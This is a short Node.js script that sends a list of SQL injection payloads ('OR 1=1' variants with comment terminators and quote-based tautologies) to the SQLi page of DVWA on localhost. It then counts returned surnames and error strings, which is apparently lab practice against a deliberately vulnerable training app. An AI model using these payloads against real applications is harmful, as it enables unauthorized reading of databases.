const axios = require('axios');

async function testPayloads() {
  const cookie = 'PHPSESSID=lb697jksj4r3n6d6cdq33sh0s3; security=low';
  const base = 'http://localhost:8080/vulnerabilities/sqli/';
  
  const payloads = [
    { name: 'Normal', value: '1' },
    { name: 'Single quote', value: "'" },
    { name: 'OR 1=1 (no comment)', value: "1 OR 1=1" },
    { name: 'OR 1=1 with --', value: "1 OR 1=1 --" },
    { name: 'OR 1=1 with -- -', value: "1 OR 1=1 -- -" },
    { name: 'OR 1=1 with #', value: "1 OR 1=1 #" },
    { name: "' OR '1'='1", value: "' OR '1'='1" },
    { name: "1' OR '1'='1", value: "1' OR '1'='1" }
  ];
  
  console.log('Testing DVWA SQLi payloads...\n');
  
  for (const payload of payloads) {
    try {
      const response = await axios.get(base, {
        params: { id: payload.value, Submit: 'Submit' },
        headers: { Cookie: cookie }
      });
      
      const surnameCount = (response.data.match(/Surname/gi) || []).length;
      const hasError = response.data.toLowerCase().includes('syntax') || 
                      response.data.toLowerCase().includes('error');
      
      console.log(`${payload.name.padEnd(25)} → Surnames: ${surnameCount}, Error: ${hasError}`);
    } catch (e) {
      console.log(`${payload.name.padEnd(25)} → ERROR: ${e.message}`);
    }
  }
}

testPayloads();
